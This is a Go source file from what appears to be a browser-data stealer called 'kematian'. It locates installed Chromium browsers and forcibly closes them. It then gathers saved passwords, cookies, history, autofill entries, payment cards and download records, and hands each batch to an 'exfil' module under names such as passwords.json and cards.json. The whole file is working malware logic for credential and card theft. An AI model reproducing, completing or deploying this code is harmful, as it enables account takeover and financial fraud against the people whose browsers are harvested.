package browsers

import (
	"kdot/kematian/browsers/chromium/autofill"
	"kdot/kematian/browsers/chromium/cards"
	"kdot/kematian/browsers/chromium/cookies"
	"kdot/kematian/browsers/chromium/downloads"
	"kdot/kematian/browsers/chromium/finder"
	"kdot/kematian/browsers/chromium/history"
	"kdot/kematian/browsers/chromium/pass"
	"kdot/kematian/browsers/chromium/structs"
	"kdot/kematian/browsers/util"
	"kdot/kematian/exfil"
)

func GetBrowserPasswords(browsers []structs.Browser) {
	//fmt.Println(pass.GetPasswords())
	//os.WriteFile("passwords.json", []byte(pass.Get(browsers)), 0644)
	exfil.PrintStuff("passwords.json", pass.Get(browsers))
}

func GetBrowserCookies(browsers []structs.Browser) {
	outCookies := cookies.GetCookiesAuto(browsers)
	for _, cookie := range outCookies {
		//os.WriteFile("cookies_netscape_"+cookie.browserName+".txt", []byte(cookie.cookies), 0644)
		exfil.PrintStuff("cookies_netscape_"+cookie.BrowserName+".txt", cookie.Cookies)
	}

}

func GetBrowserHistory(browsers []structs.Browser) {
	//fmt.Println(history.GetHistory())
	//os.WriteFile("history.json", []byte(history.Get(browsers)), 0644)
	exfil.PrintStuff("history.json", history.Get(browsers))
}

func GetBrowserAutofill(browsers []structs.Browser) {
	//os.WriteFile("autofill.json", []byte(autofill.Get(browsers)), 0644)
	exfil.PrintStuff("autofill.json", autofill.Get(browsers))
}

func GetBrowserCards(browsers []structs.Browser) {
	//os.WriteFile("cards.json", []byte(cards.Get(browsers)), 0644)
	exfil.PrintStuff("cards.json", cards.Get(browsers))
}

func GetBrowserDownloads(browsers []structs.Browser) {
	//os.WriteFile("downloads.json", []byte(downloads.Get(browsers)), 0644)
	exfil.PrintStuff("downloads.json", downloads.Get(browsers))
}

func GetBrowserData() {
	totalBrowsers := finder.FindBrowsers()
	util.CloseBrowsers()
	GetBrowserPasswords(totalBrowsers)
	GetBrowserHistory(totalBrowsers)
	GetBrowserCookies(totalBrowsers)
	GetBrowserDownloads(totalBrowsers)
	GetBrowserCards(totalBrowsers)
	GetBrowserAutofill(totalBrowsers)
}
